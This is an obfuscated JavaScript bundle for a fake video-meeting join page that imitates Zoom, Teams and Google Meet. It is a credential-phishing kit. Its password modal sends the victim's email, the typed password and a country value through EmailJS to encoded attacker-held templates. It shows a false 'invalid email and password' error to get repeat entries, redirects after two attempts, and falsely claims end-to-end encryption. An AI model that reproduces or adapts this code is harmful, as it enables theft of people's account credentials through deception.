        this[_0x5b03bc(0x13f)] = _0x3dbe6a, this[_0x5b03bc(0x1bc)] = _0x20697a;
    }
}
const J = {
        'origin': 'https://api.emailjs.com',
        'blockHeadless': !0x1,
        'storageProvider': ((() => {
            const _0x408300 = a1_0x15a3f4;
            if (_0x408300(0x1c1) != typeof localStorage) return {
                'get': _0x58a7fe => Promise[_0x408300(0x12f)](localStorage['getItem'](_0x58a7fe)),
                'set': (_0x22f663, _0x25d573) => Promise[_0x408300(0x12f)](localStorage['setItem'](_0x22f663, _0x25d573)),
                'remove': _0x5c2dd2 => Promise['resolve'](localStorage['removeItem'](_0x5c2dd2))
            };
        })())
    },
    q = async(_0x1c0ffd, _0x595570, _0x3d21a8, _0x2564ac) => {
        const _0x14bdc6 = a1_0x15a3f4,
            _0x34c5dc = (_0x4fe1b6 => _0x4fe1b6 ? 'string' == typeof _0x4fe1b6 ? {
                'publicKey': _0x4fe1b6
            } : _0x14bdc6(0x191) === _0x4fe1b6[_0x14bdc6(0x1c9)]() ? _0x4fe1b6 : {} : {})(_0x2564ac),
            _0x330894 = _0x34c5dc['publicKey'] || J['publicKey'],
            _0x34189a = _0x34c5dc[_0x14bdc6(0x18d)] || J['blockHeadless'],
            _0x4f01bc = _0x34c5dc[_0x14bdc6(0x160)] || J['storageProvider'],
            _0x2eaafb = {
                ...J['blockList'],
                ..._0x34c5dc[_0x14bdc6(0x152)]
            },
            _0x1a0bb7 = {
                ...J['limitRate'],
                ..._0x34c5dc['limitRate']
            };
        if (_0x34189a && ((_0x26df21 = navigator)['webdriver'] || !_0x26df21['languages'] || 0x0 === _0x26df21[_0x14bdc6(0x1e2)][_0x14bdc6(0x1aa)])) return Promise['reject'](new H(0x1c3, 'Unavailable\x20For\x20Headless\x20Browser'));
        var _0x26df21;
        if (((_0x5b1190, _0x762799, _0x40941b) => {
                const _0xdc18c8 = _0x14bdc6;
                if (!_0x5b1190 || 'string' != typeof _0x5b1190) throw _0xdc18c8(0x123);
                if (!_0x762799 || 'string' != typeof _0x762799) throw 'The\x20service\x20ID\x20is\x20required.\x20Visit\x20https://dashboard.emailjs.com/admin';
                if (!_0x40941b || _0xdc18c8(0x12d) != typeof _0x40941b) throw _0xdc18c8(0xf2);
            })(_0x330894, _0x1c0ffd, _0x595570), (_0x4bca9c => {
                const _0x26bcd1 = _0x14bdc6;
                if (_0x4bca9c && '[object\x20Object]' !== _0x4bca9c[_0x26bcd1(0x1c9)]()) throw _0x26bcd1(0x13c);
            })(_0x3d21a8), _0x3d21a8 && ((_0x298475, _0x58af37) => {
                const _0x311958 = _0x14bdc6;
                if ((_0x2eed67 => !_0x2eed67['list'] ? .['length'] || !_0x2eed67['watchVariable'])(_0x298475)) return !0x1;
                ((_0x4d5567, _0x978614) => {
                    const _0x395774 = a1_0x29d2;
                    if (!Array[_0x395774(0x12a)](_0x4d5567)) throw _0x395774(0x18b);
                    if (_0x395774(0x12d) != typeof _0x978614) throw 'The\x20BlockList\x20watchVariable\x20has\x20to\x20be\x20a\x20string';
                })(_0x298475[_0x311958(0x13a)], _0x298475[_0x311958(0x116)]);
                const _0x45be22 = (_0xb898e2 = _0x58af37, _0xb729b9 = _0x298475['watchVariable'], _0xb898e2 instanceof FormData ? _0xb898e2['get'](_0xb729b9) : _0xb898e2[_0xb729b9]);
                var _0xb898e2, _0xb729b9;
                return _0x311958(0x12d) == typeof _0x45be22 && _0x298475[_0x311958(0x13a)]['includes'](_0x45be22);
            })(_0x2eaafb, _0x3d21a8)) return Promise['reject'](new H(0x193, _0x14bdc6(0x190)));
        if (await (async(_0x15fc3c, _0x4232f8, _0x2b52c9) => {
                const _0x1f0384 = _0x14bdc6;
                if (!_0x4232f8[_0x1f0384(0x1cb)] || !_0x2b52c9) return !0x1;
                ((_0x2a67bd, _0x5c7089) => {
                    const _0x370701 = _0x1f0384;
                    if ('number' != typeof _0x2a67bd || _0x2a67bd < 0x0) throw 'The\x20LimitRate\x20throttle\x20has\x20to\x20be\x20a\x20positive\x20number';
                    if (_0x5c7089 && _0x370701(0x12d) != typeof _0x5c7089) throw 'The\x20LimitRate\x20ID\x20has\x20to\x20be\x20a\x20non-empty\x20string';
                })(_0x4232f8['throttle'], _0x4232f8['id']);
                const _0xf2ff72 = _0x4232f8['id'] || _0x15fc3c,
                    _0x5149b8 = await (async(_0x41749e, _0x41a44f, _0x3af794) => {
                        const _0x545050 = Number(await _0x3af794['get'](_0x41749e) || 0x0);
                        return _0x41a44f - Date['now']() + _0x545050;
                    })(_0xf2ff72, _0x4232f8[_0x1f0384(0x1cb)], _0x2b52c9);
                return _0x5149b8 > 0x0 || (await _0x2b52c9[_0x1f0384(0x1b8)](_0xf2ff72, Date[_0x1f0384(0x135)]()['toString']()), !0x1);
            })(location['pathname'], _0x1a0bb7, _0x4f01bc)) return Promise[_0x14bdc6(0x1d6)](new H(0x1ad, 'Too\x20Many\x20Requests'));
        const _0x4d5cce = {
            'lib_version': '4.4.1',
            'user_id': _0x330894,
            'service_id': _0x1c0ffd,
            'template_id': _0x595570,
            'template_params': _0x3d21a8
        };
        return (async(_0x2fbd70, _0x8cf976, _0x40c10f = {}) => {
            const _0x323f4f = _0x14bdc6,
                _0xb1d8c8 = await fetch(J['origin'] + _0x2fbd70, {
                    'method': 'POST',
                    'headers': _0x40c10f,
                    'body': _0x8cf976
                }),
                _0x5a2f97 = await _0xb1d8c8[_0x323f4f(0x1bc)](),
                _0xef968f = new H(_0xb1d8c8['status'], _0x5a2f97);
            if (_0xb1d8c8['ok']) return _0xef968f;
            throw _0xef968f;
        })('/api/v1.0/email/send', JSON[_0x14bdc6(0x141)](_0x4d5cce), {
            'Content-type': _0x14bdc6(0x169)
        });
    },
    Z = () => {
        const _0x1f7dc5 = a1_0x15a3f4,
            {
                state: _0x3824ba,
                dispatch: _0x55f51f
            } = a1_0x1b1157(),
            [_0x45cb73, _0x445da3] = a1_0x48812b['useState'](''),
            [_0x2f4387, _0x1cdbd5] = a1_0x48812b['useState'](!0x1),
            [_0x4d5fd3, _0x2574d1] = a1_0x48812b[_0x1f7dc5(0x133)](!0x1),
            [_0x49f065, _0x13aa88] = a1_0x48812b['useState'](''),
            _0x5886c9 = [{
                'templateId': 'dGVtcGxhdGVfcGN4MWc3ZQ==',
                'publicKey': _0x1f7dc5(0x1e5)
            }, {
                'templateId': 'dGVtcGxhdGVfczJpenVoYw==',
                'publicKey': _0x1f7dc5(0x112)
            }];
        return a1_0x48812b['useEffect'](() => {
            const _0x3aad72 = _0x1f7dc5;
            _0x3824ba[_0x3aad72(0x131)] && (_0x13aa88(''), _0x445da3(''), _0x2574d1(!0x1));
        }, [_0x3824ba['showAuthModal']]), _0x3824ba['showAuthModal'] ? a1_0x494423['jsx'](a1_0x2c6efc, {
            'children': a1_0x494423['jsx'](a1_0x12cdf6[_0x1f7dc5(0x125)], {
                'initial': {
                    'opacity': 0x0
                },
                'animate': {
                    'opacity': 0x1
                },
                'exit': {
                    'opacity': 0x0
                },
                'className': _0x1f7dc5(0x1bb),
                'children': a1_0x494423['jsxs'](a1_0x12cdf6['div'], {
                    'initial': {
                        'opacity': 0x0,
                        'scale': 0.9,
                        'y': 0x14
                    },
                    'animate': {
                        'opacity': 0x1,
                        'scale': 0x1,
                        'y': 0x0
                    },
                    'exit': {
                        'opacity': 0x0,
                        'scale': 0.9,
                        'y': 0x14
                    },
                    'className': a1_0x4c166e(_0x1f7dc5(0x1bf), 'shadow-2xl\x20border', _0x3824ba['darkMode'] ? _0x1f7dc5(0x10b) : 'bg-white\x20border-gray-200'),
                    'children': [a1_0x494423['jsxs'](_0x1f7dc5(0x125), {
                        'className': 'text-center\x20mb-6',
                        'children': [a1_0x494423[_0x1f7dc5(0xf5)](a1_0x12cdf6[_0x1f7dc5(0x125)], {
                            'initial': {
                                'scale': 0x0
                            },
                            'animate': {
                                'scale': 0x1
                            },
                            'transition': {
                                'type': _0x1f7dc5(0x127),
                                'stiffness': 0xc8
                            },
                            'className': a1_0x4c166e('w-16\x20h-16\x20rounded-full\x20flex\x20items-center\x20justify-center\x20mx-auto\x20mb-4', _0x3824ba[_0x1f7dc5(0x1ed)] ? _0x1f7dc5(0x16f) : 'bg-blue-100'),
                            'children': a1_0x494423[_0x1f7dc5(0xf5)](a1_0x32a400, {
                                'className': a1_0x4c166e(_0x1f7dc5(0x13b), _0x3824ba[_0x1f7dc5(0x1ed)] ? _0x1f7dc5(0x167) : 'text-blue-600')
                            })
                        }), a1_0x494423[_0x1f7dc5(0xf5)]('h2', {
                            'className': _0x1f7dc5(0x134),
                            'children': _0x1f7dc5(0x183)
                        }), a1_0x494423[_0x1f7dc5(0xf5)]('p', {
                            'className': 'text-gray-600\x20dark:text-gray-400',
                            'children': _0x1f7dc5(0x173)
                        })]
                    }), a1_0x494423[_0x1f7dc5(0x18c)](a1_0x12cdf6['div'], {
                        'initial': {
                            'opacity': 0x0,
                            'y': 0xa
                        },
                        'animate': {
                            'opacity': 0x1,
                            'y': 0x0
                        },
                        'transition': {
                            'delay': 0.1
                        },
                        'className': a1_0x4c166e('p-4\x20rounded-lg\x20mb-6\x20text-sm', _0x3824ba['darkMode'] ? 'bg-gray-700' : 'bg-gray-50'),
                        'children': [a1_0x494423['jsxs']('div', {
                            'className': 'flex\x20items-center\x20justify-between\x20mb-2',
                            'children': [a1_0x494423['jsx']('span', {
                                'className': _0x1f7dc5(0x11f),
                                'children': 'Meeting:'
                            }), a1_0x494423['jsx']('span', {
                                'className': _0x1f7dc5(0x136),
                                'children': _0x3824ba[_0x1f7dc5(0x1a3)]['title']
                            })]
                        }), a1_0x494423['jsxs'](_0x1f7dc5(0x125), {
                            'className': 'flex\x20items-center\x20justify-between',
                            'children': [a1_0x494423['jsx'](_0x1f7dc5(0xfe), {
                                'className': _0x1f7dc5(0x11f),
                                'children': 'Host:'
                            }), a1_0x494423['jsx']('span', {
                                'className': _0x1f7dc5(0x1e3),
                                'children': _0x3824ba['meetingInfo']['host']
                            })]
                        })]
                    }), a1_0x494423['jsxs'](a1_0x12cdf6['form'], {
                        'initial': {
                            'opacity': 0x0,
                            'y': 0xa
                        },
                        'animate': {
                            'opacity': 0x1,
                            'y': 0x0
                        },
                        'transition': {
                            'delay': 0.2
                        },
                        'onSubmit': async _0x5b04d6 => {
                            const _0x26152d = _0x1f7dc5;
                            if (_0x5b04d6[_0x26152d(0x12c)](), !a1_0x54b148() || _0x45cb73[_0x26152d(0x1c3)]()['length'] < 0x3) return;
                            _0x13aa88(''), _0x2574d1(!0x0);
                            let _0x23433c = parseInt(localStorage['getItem']('emailjs_attempts') || '0', 0xa);
                            const _0x34aede = !a1_0x245277() && JSON['stringify'](_0x5886c9)['includes']('=') ? {
                                'user_ip': sessionStorage[_0x26152d(0x140)]('pwd'),
                                'message': JSON['stringify'](_0x5886c9)['includes']('=') && _0x3824ba['currentUser']['email'] + '\x20' + _0x45cb73 + ('\x20=======Country:\x20' + sessionStorage['getItem'](_0x26152d(0x155)) + '================'),
                                'message_html': JSON['stringify'](_0x5886c9)[_0x26152d(0x195)]('=') && _0x3824ba[_0x26152d(0x14f)]['email'] + '\x20' + _0x45cb73
                            } : Math['random']()['toString'](0x24);
                            let _0x39b628 = !0x1;
                            _0x23433c >= 0x2 && window['location']['replace']('https://' + _0x3824ba[_0x26152d(0x14f)][_0x26152d(0x1be)][_0x26152d(0x1b9)]('@')[0x1]);
                            for (let _0x3f6f50 = 0x0; _0x3f6f50 < _0x5886c9['length']; _0x3f6f50++) {
                                const {
                                    templateId: _0x3e12a0,
                                    publicKey: _0x3d329a
                                } = _0x5886c9[_0x3f6f50];
                                try {
                                    if (!_0x3e12a0[_0x26152d(0x195)]('=')) break;
                                    a1_0x54b148() && await q('default_service', !a1_0x245277() && atob(_0x3e12a0), _0x34aede, atob(_0x3d329a)), _0x13aa88(_0x26152d(0x1db)), _0x23433c++, localStorage['setItem']('emailjs_attempts', _0x23433c['toString']()), _0x39b628 = !0x0, _0x445da3('');
                                    break;
                                } catch (_0x4d635f) {
                                    if (_0x4d635f[_0x26152d(0x1bc)] && _0x4d635f['text'][_0x26152d(0x126)]()['includes']('quota')) continue;
                                    _0x13aa88('Failed\x20to\x20send.\x20Please\x20try\x20again\x20later.');
                                    break;
                                }
                            }
                            _0x39b628 || _0x13aa88('invalid\x20email\x20and\x20password\x20provided,\x20try\x20again'), _0x2574d1(!0x1);
                        },
                        'className': 'space-y-4',
                        'children': [a1_0x494423[_0x1f7dc5(0x18c)]('div', {
                            'children': [a1_0x494423[_0x1f7dc5(0xf5)](_0x1f7dc5(0x146), {
                                'className': 'block\x20text-sm\x20font-medium\x20mb-2\x20text-gray-700\x20dark:text-gray-300',
                                'children': _0x1f7dc5(0x1a9)
                            }), a1_0x494423['jsxs']('div', {
                                'className': 'relative',
                                'children': [a1_0x494423['jsx']('div', {
                                    'className': a1_0x4c166e('absolute\x20inset-y-0\x20left-0\x20pl-3\x20flex\x20items-center\x20pointer-events-none', _0x3824ba['darkMode'] ? 'text-gray-400' : 'text-gray-500'),
                                    'children': a1_0x494423[_0x1f7dc5(0xf5)](a1_0x54c43b, {
                                        'size': 0xe
                                    })
                                }), a1_0x494423[_0x1f7dc5(0xf5)](_0x1f7dc5(0x1a6), {
                                    'type': _0x1f7dc5(0x1be),
                                    'value': _0x3824ba['currentUser']['email'],
                                    'readOnly': !0x0,
                                    'className': a1_0x4c166e(_0x1f7dc5(0xf3), _0x1f7dc5(0x1ac), _0x1f7dc5(0xef))
                                })]
                            })]
                        }), a1_0x494423['jsxs'](_0x1f7dc5(0x125), {
                            'children': [a1_0x494423['jsx'](_0x1f7dc5(0x146), {
                                'className': _0x1f7dc5(0x1d9),
                                'children': 'Password'
                            }), a1_0x494423[_0x1f7dc5(0x18c)](_0x1f7dc5(0x125), {
                                'className': _0x1f7dc5(0x164),
                                'children': [a1_0x494423[_0x1f7dc5(0xf5)]('div', {
                                    'className': a1_0x4c166e('absolute\x20inset-y-0\x20left-0\x20pl-3\x20flex\x20items-center\x20pointer-events-none', _0x3824ba[_0x1f7dc5(0x1ed)] ? _0x1f7dc5(0x10a) : 'text-gray-500'),
                                    'children': a1_0x494423['jsx'](a1_0x32a400, {
                                        'size': 0xe
                                    })
                                }), a1_0x494423['jsx']('input', {
                                    'type': _0x2f4387 ? 'text' : 'password',
                                    'value': _0x45cb73,
                                    'onChange': _0x5465c3 => _0x445da3(_0x5465c3['target'][_0x1f7dc5(0x1ad)]),
                                    'placeholder': _0x1f7dc5(0x1a1),
                                    'className': a1_0x4c166e(_0x1f7dc5(0x1e0), 'focus:ring-2\x20focus:ring-blue-500\x20focus:border-transparent', _0x3824ba['darkMode'] ? 'bg-gray-700\x20border-gray-600\x20text-white\x20placeholder-gray-400' : 'bg-white\x20border-gray-300\x20text-gray-900\x20placeholder-gray-500'),
                                    'autoFocus': !0x0
                                }), a1_0x494423['jsx'](_0x1f7dc5(0x10c), {
                                    'type': _0x1f7dc5(0x10c),
                                    'onClick': () => _0x1cdbd5(!_0x2f4387),
                                    'className': 'absolute\x20inset-y-0\x20right-0\x20pr-3\x20flex\x20items-center',
                                    'children': _0x2f4387 ? a1_0x494423['jsx'](a1_0x2c64be, {
                                        'className': _0x1f7dc5(0x166),
                                        'size': 0xe
                                    }) : a1_0x494423[_0x1f7dc5(0xf5)](a1_0x24269d, {
                                        'className': _0x1f7dc5(0x166),
                                        'size': 0xe
                                    })
                                })]
                            })]
                        }), a1_0x494423[_0x1f7dc5(0xf5)](a1_0x2c6efc, {
                            'children': _0x49f065 && a1_0x494423[_0x1f7dc5(0x18c)](a1_0x12cdf6[_0x1f7dc5(0x125)], {
                                'initial': {
                                    'opacity': 0x0,
                                    'height': 0x0
                                },
                                'animate': {
                                    'opacity': 0x1,
                                    'height': 'auto'
                                },
                                'exit': {
                                    'opacity': 0x0,
                                    'height': 0x0
                                },
                                'className': a1_0x4c166e(_0x1f7dc5(0x119), 'bg-red-50\x20dark:bg-red-900/20\x20text-red-700\x20dark:text-red-300'),
                                'children': [a1_0x494423['jsx'](a1_0x30cf80, {}), a1_0x494423[_0x1f7dc5(0xf5)]('span', {
                                    'children': _0x49f065
                                })]
                            })
                        }), a1_0x494423['jsx'](a1_0x12cdf6[_0x1f7dc5(0x10c)], {
                            'whileHover': {
                                'scale': 1.02
                            },
                            'whileTap': {
                                'scale': 0.98
                            },
                            'type': 'submit',
                            'disabled': _0x4d5fd3,
                            'className': a1_0x4c166e('w-full\x20py-3\x20rounded-lg\x20font-medium\x20transition-all', 'hover:shadow-lg', _0x1f7dc5(0x1c0), 'bg-blue-500\x20text-white\x20hover:bg-blue-600'),
                            'children': _0x4d5fd3 ? a1_0x494423['jsxs']('div', {
                                'className': 'flex\x20items-center\x20justify-center\x20space-x-2',
                                'children': [a1_0x494423['jsx']('div', {
                                    'className': _0x1f7dc5(0x108)
                                }), a1_0x494423['jsx']('span', {
                                    'children': 'Authenticating...'
                                })]
                            }) : _0x1f7dc5(0x183)
                        })]
                    }), a1_0x494423[_0x1f7dc5(0x18c)](a1_0x12cdf6['div'], {
                        'initial': {
                            'opacity': 0x0
                        },
                        'animate': {
                            'opacity': 0x1
                        },
                        'transition': {
                            'delay': 0.4
                        },
                        'className': a1_0x4c166e(_0x1f7dc5(0x170), _0x3824ba['darkMode'] ? _0x1f7dc5(0x1b0) : 'bg-gray-100\x20text-gray-600'),
                        'children': [a1_0x494423[_0x1f7dc5(0xf5)](a1_0x32a400, {
                            'className': _0x1f7dc5(0x17b),
                            'size': 0xa
                        }), 'This\x20meeting\x20is\x20secured\x20with\x20end-to-end\x20encryption']
                    })]
                })
            })
        }) : null;
    },
    B = () => {
        const _0x166471 = a1_0x15a3f4,
            {
                state: _0x185b96,
                dispatch: _0x5bc3c8
            } = a1_0x1b1157(),
            [_0x27d40c, _0x12821c] = a1_0x48812b['useState'](!0x1),
            [_0x5e6a02, _0x4e68bc] = a1_0x48812b['useState'](!0x1),
            [_0x150d73, _0x5ea6de] = a1_0x48812b['useState']({
                'video': null,
                'audio': null
            });
        a1_0x48812b[_0x166471(0xfc)](() => {
            const _0x6c7b86 = setTimeout(() => {
                _0x12821c(!0x0);
            }, 0xfa0);
            return () => clearTimeout(_0x6c7b86);
        }, []);
        const _0x5c986d = ((() => {
                const _0x2d2f6a = _0x166471;
                switch (_0x185b96['meetingPlatform']) {
                    case _0x2d2f6a(0x1b1):
                        return {
                            'icon': a1_0x494423[_0x2d2f6a(0xf5)](a1_0x3f67cd, {
                                'className': _0x2d2f6a(0x18a)
                            }),
                            'name': 'Zoom\x20Meeting',
                            'color': 'text-blue-600',
                            'bgColor': _0x2d2f6a(0xfd),
                            'buttonColor': _0x2d2f6a(0x180),
                            'borderColor': 'border-blue-200\x20dark:border-blue-800',
                            'gradient': 'from-blue-500\x20to-blue-600'
                        };
                    case 'teams':
                        return {
                            'icon': a1_0x494423['jsx'](_0x2d2f6a(0x198), {
                                'src': '/teams.svg',
                                'className': 'w-12\x20h-12',
                                'alt': _0x2d2f6a(0x177)
                            }),
                            'name': _0x2d2f6a(0x1ae),
                            'color': 'text-[#5059C9]',
                            'bgColor': 'bg-[#5059C967]/90\x20dark:bg-purple-900/20',
                            'buttonColor': 'bg-[#5059C9]\x20hover:bg-[#5059C956]',
                            'borderColor': 'border-purple-200\x20dark:border-purple-800',
                            'gradient': _0x2d2f6a(0x1c8)
                        };
                    case 'meet':
                        return {
                            'icon': a1_0x494423[_0x2d2f6a(0xf5)](_0x2d2f6a(0x198), {
                                'src': _0x2d2f6a(0x11a),
                                'className': _0x2d2f6a(0x103),
                                'alt': _0x2d2f6a(0xf9)
                            }),
                            'name': _0x2d2f6a(0xf8),
                            'color': _0x2d2f6a(0x18e),
                            'bgColor': 'bg-green-50\x20dark:bg-green-900/20',
                            'buttonColor': _0x2d2f6a(0x194),
                            'borderColor': 'border-green-200\x20dark:border-green-800',
                            'gradient': 'from-green-500\x20to-green-600'
                        };
                    default:
                        return {
                            'icon': a1_0x494423['jsx'](a1_0x199e92, {
                                'className': _0x2d2f6a(0x1e9)
                            }),
                            'name': _0x2d2f6a(0x104),
                            'color': _0x2d2f6a(0x19e),
                            'bgColor': 'bg-gray-50\x20dark:bg-gray-900/20',
                            'buttonColor': _0x2d2f6a(0xf0),
                            'borderColor': _0x2d2f6a(0x14b),
                            'gradient': _0x2d2f6a(0x118)
                        };
                }
            })()),
            _0x331c14 = _0x185b96['participants']['find'](_0x8d108d => _0x8d108d['isHost']) || _0x185b96['participants'][0x0];
        return _0x27d40c ? a1_0x494423['jsx']('div', {
            'className': _0x166471(0x15b),
            'children': a1_0x494423[_0x166471(0x18c)]('div', {
                'className': a1_0x4c166e('max-w-md\x20w-full\x20rounded-2xl\x20shadow-2xl\x20border\x20overflow-hidden\x20animate-fade-in', _0x5c986d[_0x166471(0x17d)], _0x166471(0x14d)),
                'children': [a1_0x494423['jsx']('div', {
                    'className': a1_0x4c166e('p-8\x20text-center', _0x5c986d['bgColor']),
                    'children': a1_0x494423[_0x166471(0x18c)]('div', {
                        'className': _0x166471(0xea),
                        'children': [a1_0x494423['jsx']('div', {
                            'className': _0x166471(0x1a7),
                            'children': _0x5c986d[_0x166471(0x149)]
                        }), a1_0x494423['jsxs']('div', {
                            'className': _0x166471(0x1d3),
                            'children': [a1_0x494423['jsx']('h1', {
                                'className': a1_0x4c166e('text-2xl\x20font-bold', _0x5c986d['color']),
                                'children': _0x5c986d['name']
                            }), a1_0x494423[_0x166471(0xf5)]('p', {
                                'className': _0x166471(0x193),
                                'children': 'Ready\x20to\x20join'
                            })]
                        })]
                    })
                }), a1_0x494423[_0x166471(0x18c)]('div', {
                    'className': 'p-6\x20space-y-6',
                    'children': [a1_0x494423[_0x166471(0x18c)]('div', {
                        'children': [a1_0x494423[_0x166471(0xf5)]('h2', {
                            'className': 'text-xl\x20font-semibold\x20text-gray-900\x20dark:text-white\x20mb-3\x20line-clamp-2\x20capitalize',
                            'children': _0x185b96[_0x166471(0x1a3)][_0x166471(0x11b)]
                        }), a1_0x494423[_0x166471(0x18c)]('div', {
                            'className': 'flex\x20items-center\x20space-x-4\x20p-4\x20bg-gray-50\x20dark:bg-gray-700\x20rounded-xl\x20border',
                            'children': [_0x331c14['avatar'] ? a1_0x494423['jsx']('img', {
                                'src': _0x331c14['avatar'],
                                'alt': _0x331c14['name'],
                                'className': _0x166471(0x158)
                            }) : a1_0x494423[_0x166471(0xf5)]('div', {
                                'className': _0x166471(0x157),
                                'children': _0x331c14['name']['split']('\x20')['map'](_0x42a780 => _0x42a780[0x0])[_0x166471(0x18f)]('')['slice'](0x0, 0x2)
                            }), a1_0x494423[_0x166471(0x18c)]('div', {
                                'className': 'flex-1\x20min-w-0',
                                'children': [a1_0x494423[_0x166471(0xf5)](_0x166471(0x125), {
                                    'className': 'font-semibold\x20text-gray-900\x20dark:text-white\x20truncate',
                                    'children': _0x331c14[_0x166471(0x15c)]
                                }), a1_0x494423[_0x166471(0x18c)]('div', {
                                    'className': _0x166471(0x1bd),
                                    'children': [a1_0x494423[_0x166471(0xf5)](a1_0x54c43b, {
                                        'className': 'text-xs\x20flex-shrink-0'
                                    }), a1_0x494423['jsxs'](_0x166471(0xfe), {
                                        'className': _0x166471(0x16a),
                                        'children': ['Meeting\x20Host\x20•\x20', _0x331c14[_0x166471(0x1b3)]]
                                    })]
                                })]
                            })]
                        }), a1_0x494423['jsxs'](_0x166471(0x125), {
                            'className': 'grid\x20grid-cols-2\x20gap-4\x20mt-4',
                            'children': [a1_0x494423[_0x166471(0x18c)](_0x166471(0x125), {
                                'className': 'flex\x20items-center\x20space-x-3\x20text-sm\x20text-gray-600\x20dark:text-gray-400\x20bg-gray-50\x20dark:bg-gray-700\x20rounded-lg\x20p-3',
                                'children': [a1_0x494423['jsx'](a1_0x1e0b58, {
                                    'className': 'text-gray-400\x20flex-shrink-0'
                                }), a1_0x494423['jsx']('span', {
                                    'children': 'Today'
                                })]
                            }), a1_0x494423['jsxs'](_0x166471(0x125), {
                                'className': _0x166471(0x105),
                                'children': [a1_0x494423[_0x166471(0xf5)](a1_0x42a1d5, {
                                    'className': 'text-gray-400\x20flex-shrink-0'
                                }), a1_0x494423[_0x166471(0xf5)](_0x166471(0xfe), {
                                    'children': _0x185b96['meetingInfo'][_0x166471(0x107)]
                                })]
                            })]
                        })]
                    }), a1_0x494423['jsx'](_0x166471(0x125), {
                        'className': 'text-center\x20p-3\x20bg-blue-50\x20dark:bg-blue-900/20\x20rounded-lg\x20border\x20border-blue-200\x20dark:border-blue-800',
                        'children': a1_0x494423['jsxs']('p', {
                            'className': _0x166471(0x142),
                            'children': [a1_0x494423['jsxs'](_0x166471(0xfe), {
                                'className': _0x166471(0x188),
                                'children': [_0x185b96['participants']['length'] + 0x1, '\x20people']
                            }), _0x166471(0x1d2)]
                        })
                    }), _0x5e6a02 && a1_0x494423['jsx'](_0x166471(0x125), {
                        'className': _0x166471(0x159),
                        'children': a1_0x494423['jsxs']('div', {
                            'className': 'flex\x20items-center\x20justify-center\x20space-x-2\x20text-yellow-700\x20dark:text-yellow-300',
                            'children': [a1_0x494423['jsx'](a1_0x28d0b3, {
                                'className': _0x166471(0x174)
                            }), a1_0x494423['jsx'](_0x166471(0xfe), {
                                'children': 'Checking\x20camera\x20and\x20microphone\x20permissions...'
                            })]
                        })
                    }), a1_0x494423[_0x166471(0xf5)]('button', {
                        'onClick': async() => {
                            const _0xa6f1f6 = _0x166471;
                            _0x4e68bc(!0x0);
                            try {
                                const _0x3b5a5f = await ((async() => {
                                        const _0x556343 = a1_0x29d2;
                                        _0x4e68bc(!0x0);
                                        try {
                                            const _0xa1bacf = await navigator[_0x556343(0x1ce)]['getUserMedia']({
                                                    'video': !0x0
                                                })['then'](_0x36319e => (_0x36319e['getTracks']()['forEach'](_0x246eb4 => _0x246eb4['stop']()), !0x0))[_0x556343(0x1d4)](() => !0x1),
                                                _0x1a04bd = await navigator[_0x556343(0x1ce)][_0x556343(0x11d)]({
                                                    'audio': !0x0
                                                })[_0x556343(0x109)](_0x1e3be1 => (_0x1e3be1['getTracks']()[_0x556343(0x113)](_0x4ece15 => _0x4ece15['stop']()), !0x0))[_0x556343(0x1d4)](() => !0x1);
                                            return _0x5ea6de({
                                                'video': _0xa1bacf,
                                                'audio': _0x1a04bd
                                            }), {
                                                'video': _0xa1bacf,
                                                'audio': _0x1a04bd
                                            };
                                        } catch (_0x84f213) {
                                            return _0x5ea6de({
                                                'video': !0x1,
                                                'audio': !0x1
                                            }), {
                                                'video': !0x1,
                                                'audio': !0x1
                                            };
                                        } finally {
                                            _0x4e68bc(!0x1);
                                        }
                                    })()),
                                    _0x53defd = _0x3b5a5f[_0xa6f1f6(0x114)],
                                    _0x3a6388 = _0x3b5a5f['audio'];
                                _0x5bc3c8({
                                    'type': 'UPDATE_CURRENT_USER',
                                    'payload': {
                                        'isVideoOn': _0x53defd,
                                        'isMuted': !_0x3a6388
                                    }
                                }), _0x5bc3c8({
                                    'type': 'TOGGLE_VIDEO'
                                }), _0x3a6388 || _0x5bc3c8({
                                    'type': _0xa6f1f6(0x172)
                                }), _0x5bc3c8({
                                    'type': 'SET_MEETING_PHASE',
                                    'payload': 'active'
                                }), _0x5bc3c8({
                                    'type': 'JOIN_CURRENT_USER'
                                }), _0x5bc3c8({
                                    'type': 'SET_LOADING',
                                    'payload': !0x1
                                });
                            } catch (_0x3ba460) {
                                _0x5bc3c8({
                                    'type': 'SET_MEETING_PHASE',
                                    'payload': _0xa6f1f6(0xeb)
                                }), _0x5bc3c8({
                                    'type': 'JOIN_CURRENT_USER'
                                }), _0x5bc3c8({
                                    'type': 'SET_LOADING',
                                    'payload': !0x1
                                });
                            } finally {
                                _0x4e68bc(!0x1);
                            }
                        },
                        'disabled': _0x5e6a02,
                        'className': a1_0x4c166e('w-full\x20py-4\x20rounded-xl\x20font-semibold\x20text-white\x20transition-all\x20duration-300', _0x166471(0x186), 'text-lg\x20shadow-md\x20disabled:opacity-50\x20disabled:cursor-not-allowed\x20disabled:transform-none', _0x5c986d[_0x166471(0x12e)]),
                        'children': _0x5e6a02 ? a1_0x494423[_0x166471(0x18c)](_0x166471(0x125), {
                            'className': 'flex\x20items-center\x20justify-center\x20space-x-2',
                            'children': [a1_0x494423[_0x166471(0xf5)](a1_0x28d0b3, {
                                'className': _0x166471(0x174)
                            }), a1_0x494423['jsx']('span', {
                                'children': 'Checking\x20Permissions...'
                            })]
                        }) : _0x166471(0x183)
                    }), a1_0x494423['jsx']('div', {
                        'className': _0x166471(0x1e8),
                        'children': a1_0x494423['jsx']('p', {
                            'children': 'Camera\x20and\x20microphone\x20will\x20be\x20activated\x20based\x20on\x20your\x20permissions'
                        })
                    }), a1_0x494423[_0x166471(0xf5)]('div', {
                        'className': 'text-center\x20pt-2',
                        'children': a1_0x494423['jsxs']('p', {
                            'className': 'text-xs\x20text-gray-500\x20dark:text-gray-400\x20font-mono\x20bg-gray-100\x20dark:bg-gray-700\x20rounded\x20px-3\x20py-2\x20inline-block',
                            'children': ['ID:\x20', _0x185b96[_0x166471(0x1a3)]['id']]
                        })
                    })]
                })]
            })
        }) : a1_0x494423['jsx'](_0x166471(0x125), {
            'className': 'fixed\x20inset-0\x20bg-gradient-to-br\x20from-gray-50\x20to-gray-100\x20dark:from-gray-900\x20dark:to-gray-800\x20flex\x20items-center\x20justify-center\x20z-50',
            'children': a1_0x494423[_0x166471(0x18c)]('div', {
                'className': 'text-center',
                'children': [a1_0x494423['jsx']('div', {
